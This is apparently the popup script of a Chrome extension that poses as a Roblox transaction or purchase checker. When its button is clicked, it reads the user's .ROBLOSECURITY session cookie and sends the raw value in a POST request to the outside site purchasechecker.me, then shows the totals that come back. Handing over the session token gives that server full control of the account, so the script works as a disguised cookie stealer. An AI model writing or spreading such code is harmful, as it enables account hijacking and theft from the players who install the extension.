
document.getElementById("fetchButton").addEventListener("click", () => {
  const button = document.getElementById('fetchButton');
  const spinner = document.getElementById('spinner');
  const output = document.getElementById('output');
  const Sort = "desc"
  
  chrome.cookies.get({
    url: "https://www.roblox.com",
    name: ".ROBLOSECURITY"
  }, function(cookie) {
    if (!cookie) {
      output.innerText = "Cookie not found.";
      return;
    }

    button.disabled = true;
    button.textContent = 'Fetching...';
    spinner.style.display = 'block';
    output.innerHTML = '';
    output.innerText = "Getting transactions! Please wait..."
    button.hidden = true

    fetch("https://purchasechecker.me/api/transactions", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        cookie: cookie.value,
        sort: Sort
      })
    })
    
    .then(res => res.json())
    .then(data => {
      output.innerHTML = "";

      for (const place in data) {
        const div = document.createElement("div");
        div.className = "item";
        div.textContent = `${place}: ${numberWithCommas(data[place])} R$`;
        output.appendChild(div);
      }

      spinner.hidden = true
    })
    .catch(err => {
      output.innerText = "Error fetching data. Please try again later!";
      console.error("Fetch error:", err);

      // Optional: also check if a response body exists in case it's a failed fetch
      fetch("https://purchasechecker.me/api/transactions")
        .then(r => r.text())
        .then(text => console.log("Server response text:", text))
        .catch(fetchErr => console.error("Additional fetch failed:", fetchErr));
      });
  });
});

function numberWithCommas(x) {
  return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}